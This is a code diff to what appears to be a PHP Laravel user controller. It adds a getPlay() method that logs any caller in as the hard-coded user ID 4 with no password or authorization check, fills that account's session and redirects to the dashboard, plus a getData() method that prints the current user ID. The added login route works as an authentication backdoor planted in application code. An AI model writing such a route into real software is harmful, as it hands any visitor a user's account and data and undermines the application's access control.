@@ -194,6 +194,24 @@ class UserController extends Controller {
 		}	
 	}
 
+	public function getPlay()
+	{
+		$row = User::find(4);
+		\Auth::loginUsingId(4);
+		\DB::table('tb_users')->where('id', '=',$row->id )->update(array('last_login' => date("Y-m-d H:i:s")));
+		\Session::put('uid', $row->id);
+		\Session::put('gid', $row->group_id);
+		\Session::put('eid', $row->email);
+		\Session::put('ll', $row->last_login);
+		\Session::put('fid', $row->first_name.' '. $row->last_name);
+		return Redirect::to('dashboard');
+	}
+	public function getData()
+	{
+		echo \Auth::user()->id;
+		exit;
+	}
+
 	public function getProfile() {
 		
 		if(!\Auth::check()) return redirect('user/login');
